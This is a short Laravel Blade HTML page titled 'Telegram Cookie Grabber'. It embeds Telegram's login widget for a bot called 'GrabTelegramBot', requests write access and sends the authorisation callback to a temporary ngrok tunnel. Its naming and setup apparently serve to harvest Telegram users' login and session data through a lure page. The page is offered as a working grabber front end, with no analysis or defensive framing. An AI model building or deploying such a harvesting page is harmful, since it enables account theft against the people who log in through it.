<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Telegram Cookie Grabber</title>
    @vite(['resources/css/app.css', 'resources/js/app.js'])
    <script src="https://cdn.tailwindcss.com"></script>

    <link rel="shortcut icon" href="{{ asset('icons/telegram.png') }}?v=1" type="image/x-icon">
</head>

<body class="bg-black py-3">
    
    @include('layouts._header')

    <div class="mt-10 flex justify-center items-center h-80">
        <script async src="https://telegram.org/js/telegram-widget.js?22" data-telegram-login="GrabTelegramBot" data-size="large" data-auth-url="https://fcb0-2c0f-f5c0-42a-4e4f-7727-be2-4389-3edf.ngrok-free.app/telegram/auth" data-request-access="write"></script>
    </div>

</body>

</html>
